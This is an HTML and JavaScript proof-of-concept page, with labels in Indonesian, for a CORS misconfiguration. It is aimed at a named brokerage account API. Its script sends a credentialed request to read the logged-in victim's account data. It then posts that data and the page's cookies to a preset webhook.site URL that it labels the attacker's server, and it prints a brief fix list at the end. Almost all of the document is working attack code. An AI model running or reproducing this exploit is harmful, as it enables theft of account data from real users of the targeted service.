<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>CORS Exploit PoC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            color: #eee;
            font-family: 'Segoe UI', system-ui;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 30px;
            border-radius: 15px;
            max-width: 800px;
            width: 100%;
            border: 1px solid #2a2a4a;
        }
        h1 { color: #e94560; text-align: center; margin-bottom: 5px; }
        .sub {
            text-align: center; color: #8888aa; font-size: 14px; margin-bottom: 20px;
        }
        .log-box {
            background: #0f0f23;
            padding: 15px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            color: #aaccff;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid #2a2a4a;
        }
        .log-box .green { color: #00ff88; }
        .log-box .red { color: #ff4444; }
        .log-box .yellow { color: #ffcc00; }
        .log-box .blue { color: #66ccff; }
        .btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            transition: background 0.3s;
        }
        .btn:hover { background: #c73652; }
        .btn:disabled { background: #555; cursor: not-allowed; }
        .status {
            text-align: center;
            margin: 10px 0;
            font-size: 14px;
            color: #8888aa;
        }
        .input-group {
            margin: 15px 0;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            color: #8888aa;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0f0f23;
            color: white;
            font-size: 14px;
            font-family: 'Courier New', monospace;
        }
        .badge {
            display: inline-block;
            background: #e9456022;
            color: #e94560;
            padding: 3px 12px;
            border-radius: 20px;
            font-size: 11px;
            border: 1px solid #e9456044;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>⚡ CORS Exploit PoC</h1>
    <div class="sub">
        <span class="badge">CORS Wildcard (*)</span>
        <span class="badge" style="margin-left:8px;">Data Theft</span>
    </div>

    <div class="input-group">
        <label>🎯 Target API:</label>
        <input type="text" id="targetUrl" value="https://api.mycapital.capital.com/v1/account/">
    </div>

    <div class="input-group">
        <label>📤 Server Penyerang (Webhook):</label>
        <input type="text" id="exfilUrl" value="https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c">
    </div>

    <div class="status" id="status">Status: Siap</div>

    <button class="btn" id="attackBtn" onclick="startExploit()">
        🚀 JALANKAN EKSPLOIT
    </button>

    <div class="log-box" id="log">
        <span class="blue">[+] Menunggu aksi...</span>
    </div>
</div>

<script>
    // ==========================================
    // CORS EXPLOIT - PROOF OF CONCEPT
    // ==========================================

    const logBox = document.getElementById('log');
    const statusDiv = document.getElementById('status');
    const attackBtn = document.getElementById('attackBtn');
    const targetInput = document.getElementById('targetUrl');
    const exfilInput = document.getElementById('exfilUrl');

    let isRunning = false;

    function log(message, type = 'blue') {
        const colors = {
            green: 'green',
            red: 'red',
            yellow: 'yellow',
            blue: 'blue'
        };
        const cls = colors[type] || 'blue';
        const entry = document.createElement('div');
        entry.className = cls;
        entry.textContent = message;
        logBox.appendChild(entry);
        logBox.scrollTop = logBox.scrollHeight;
    }

    function setStatus(text, loading = false) {
        statusDiv.textContent = text;
        if (loading) {
            attackBtn.disabled = true;
            attackBtn.textContent = '⏳ Memproses...';
        } else {
            attackBtn.disabled = false;
            attackBtn.textContent = '🚀 JALANKAN EKSPLOIT';
        }
    }

    // ==========================================
    // FUNGSI EKSPLOIT UTAMA
    // ==========================================
    async function startExploit() {
        if (isRunning) return;
        isRunning = true;

        logBox.innerHTML = '';
        log('[+] Memulai exploit...', 'blue');

        const targetUrl = targetInput.value.trim();
        const exfilUrl = exfilInput.value.trim();

        if (!targetUrl || !exfilUrl) {
            log('❌ Target dan Webhook URL harus diisi!', 'red');
            isRunning = false;
            return;
        }

        setStatus('⏳ Mengirim request...', true);

        try {
            // ==========================================
            // STEP 1: Kirim request ke API target
            // ==========================================
            log(`📡 Target: ${targetUrl}`, 'blue');
            log(`🔑 Mode: credentials: 'include' (mengirim cookie)`, 'blue');

            const response = await fetch(targetUrl, {
                method: 'GET',
                credentials: 'include',  // 🔑 Kirim cookie!
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            });

            const status = response.status;
            const statusText = response.statusText;

            log(`📊 Status: ${status} ${statusText}`, status === 200 ? 'green' : 'yellow');

            // ==========================================
            // STEP 2: Baca data dari response
            // ==========================================
            let data = '';
            const contentType = response.headers.get('content-type') || '';

            if (contentType.includes('application/json')) {
                const jsonData = await response.json();
                data = JSON.stringify(jsonData, null, 2);
            } else {
                data = await response.text();
            }

            log(`📦 Data yang diterima:`, 'blue');
            log(data.length > 500 ? data.substring(0, 500) + '...' : data, 'green');

            // ==========================================
            // STEP 3: Kirim data ke Webhook (server penyerang)
            // ==========================================
            const payload = {
                timestamp: new Date().toISOString(),
                target: targetUrl,
                status: status,
                statusText: statusText,
                data: data,
                userAgent: navigator.userAgent,
                origin: window.location.origin,
                cookie: document.cookie || '(HttpOnly - tidak bisa dibaca JS)'
            };

            log(`📤 Mengirim data ke server penyerang: ${exfilUrl}`, 'blue');

            await fetch(exfilUrl, {
                method: 'POST',
                mode: 'no-cors',  // 🔓 Agar tidak diblokir CORS
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            log('✅ DATA BERHASIL DIKIRIM KE SERVER PENYERANG!', 'green');
            log(`📤 Server: ${exfilUrl}`, 'green');

            // ==========================================
            // STEP 4: Tampilkan detail payload
            // ==========================================
            log('📦 Payload yang dikirim:', 'blue');
            log(JSON.stringify(payload, null, 2), 'green');

            // ==========================================
            // STEP 5: Analisis hasil
            // ==========================================
            if (status === 200) {
                log('', 'blue');
                log('✅✅✅ EKSPLOIT BERHASIL! Data sensitif berhasil dicuri!', 'green');
                log('🔴 Ini adalah BUKTI KERENTANAN CORS!', 'red');
            } else if (status === 403) {
                log('', 'blue');
                log('⚠️ Status 403: Belum login ke capital.com', 'yellow');
                log('✅ TAPI CORS tetap longgar!', 'green');
                log('🔴 Jika user SUDAH LOGIN, data BISA dicuri!', 'red');
                log('🔴 Ini tetap BUKTI KERENTANAN!', 'red');
            } else {
                log('', 'blue');
                log(`ℹ️ Status ${status}: Belum tentu kerentanan`, 'yellow');
            }

            // Tampilkan rekomendasi
            log('', 'blue');
            log('📋 REKOMENDASI UNTUK KLIEN:', 'yellow');
            log('1. Hapus Access-Control-Allow-Origin: *', 'yellow');
            log('2. Gunakan whitelist domain yang valid', 'yellow');
            log('3. Jangan gunakan credentials: true dengan origin *', 'yellow');

            setStatus('✅ Selesai - CORS Vulnerable!', false);

        } catch (error) {
            log(`❌ Error: ${error.message}`, 'red');

            // Cek apakah error karena CORS
            if (error.message.includes('Failed to fetch')) {
                log('', 'blue');
                log('🔍 Kemungkinan CORS AMAN - request diblokir browser', 'yellow');
                log('💡 Atau URL target tidak valid / tidak bisa diakses', 'yellow');
            }

            setStatus('❌ Gagal', false);
        }

        isRunning = false;
    }

    // ==========================================
    // AUTO-RUN
    // ==========================================
    window.onload = function() {
        log('[+] Halaman PoC siap', 'blue');
        log('📌 Pastikan Anda sudah login ke capital.com', 'yellow');
        log('💡 Klik tombol untuk menjalankan exploit', 'blue');
    };
</script>

</body>
</html>
